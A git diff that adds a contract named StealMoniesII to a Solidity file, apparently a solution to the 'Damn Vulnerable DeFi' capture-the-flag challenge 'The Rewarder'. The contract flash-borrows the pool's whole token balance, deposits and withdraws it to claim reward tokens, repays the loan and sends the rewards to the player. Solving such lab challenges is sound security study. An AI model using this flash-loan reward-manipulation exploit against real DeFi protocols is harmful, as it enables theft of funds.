@@ -5,6 +5,45 @@ import "solady/src/utils/FixedPointMathLib.sol";
 import "solady/src/utils/SafeTransferLib.sol";
 import { RewardToken } from "./RewardToken.sol";
 import { AccountingToken } from "./AccountingToken.sol";
+import {FlashLoanerPool} from "./FlashLoanerPool.sol";
+import "../DamnValuableToken.sol";
+
+
+contract StealMoniesII {
+    TheRewarderPool pool;
+    FlashLoanerPool flashPool;
+    DamnValuableToken liquidityToken;
+    RewardToken rToken;
+    address player;
+
+    constructor(TheRewarderPool _pool, FlashLoanerPool _flashPool, DamnValuableToken _liquidityToken, RewardToken _rToken) {
+        player = msg.sender;
+        pool = _pool;
+        flashPool = _flashPool;
+        rToken = _rToken;
+        liquidityToken= _liquidityToken;
+    }
+
+    function takeMonies() external {
+        flashPool.flashLoan(liquidityToken.balanceOf(address(flashPool)));
+
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        // put tokens in and get reward
+        liquidityToken.approve(address(pool), amount);
+        pool.deposit(amount);
+        pool.withdraw(amount);
+
+        // return tokens
+        liquidityToken.transfer(msg.sender, amount);
+
+        // transfer reward tokens
+        rToken.transfer(player, rToken.balanceOf(address(this)));
+    }
+
+}
+
 
 /**
  * @title TheRewarderPool
